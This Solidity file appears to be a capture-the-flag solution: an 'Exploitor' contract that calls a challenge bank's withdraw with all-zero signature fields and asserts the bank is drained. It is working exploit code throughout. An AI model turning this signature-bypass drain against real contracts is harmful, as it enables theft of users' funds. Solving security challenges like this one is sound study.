// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Challenge.sol";
import "./ISimpleBank.sol";

contract Exploitor {
    Challenge public immutable challenge;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    function exploit() public payable {
        ISimpleBank bank = challenge.BANK();
        bank.withdraw{value: 9 wei}(
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            ),
            0x0,
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            ),
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            )
        );
        assert(address(bank).balance == 0);
    }

    receive() external payable {
        if (msg.value < 50 wei) {
            revert("12333");
        }
    }
}
